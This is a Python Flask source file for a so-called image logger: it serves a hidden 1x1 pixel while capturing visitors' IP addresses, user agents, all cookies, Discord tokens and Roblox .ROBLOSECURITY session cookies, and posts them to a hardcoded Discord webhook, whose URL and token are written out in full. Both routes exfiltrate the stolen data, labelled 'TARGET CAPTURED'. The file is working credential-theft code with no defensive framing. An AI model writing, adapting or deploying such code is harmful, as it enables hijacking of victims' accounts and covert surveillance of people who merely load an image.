from flask import Flask, request
import requests
import json
from datetime import datetime
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

@app.route('/')
def index():
    cookies = dict(request.cookies)
    discord_token = cookies.get('token', 'No token found')
    roblox_cookie = cookies.get('.ROBLOSECURITY', 'No Roblox cookie found')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    payload = {
        "content": "@everyone @here **IMAGE LOGGER HIT**",
        "embeds": [{
            "title": "🖼️ TARGET CAPTURED",
            "description": f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "color": 16711680,
            "fields": [
                {"name": "🌐 IP", "value": ip, "inline": True},
                {"name": "🔗 Referer", "value": referer[:100], "inline": True},
                {"name": "🖥️ User Agent", "value": user_agent[:100], "inline": False},
                {"name": "🔑 Discord Token", "value": f"```{discord_token}```", "inline": False},
                {"name": "🍪 Roblox Cookie", "value": f"```{roblox_cookie}```", "inline": False},
                {"name": "📋 All Cookies", "value": f"```json\n{json.dumps(cookies, indent=2)}```", "inline": False}
            ]
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass
    
    return '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" width="1" height="1">'

@app.route('/track')
def track():
    cookies = dict(request.cookies)
    discord_token = cookies.get('token', 'No token')
    roblox_cookie = cookies.get('.ROBLOSECURITY', 'No cookie')
    
    payload = {
        "content": "🎯 **TRACKING HIT**",
        "embeds": [{
            "fields": [
                {"name": "IP", "value": request.remote_addr, "inline": True},
                {"name": "Token", "value": f"```{discord_token}```", "inline": False},
                {"name": "Cookie", "value": f"```{roblox_cookie}```", "inline": False}
            ]
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass
    
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
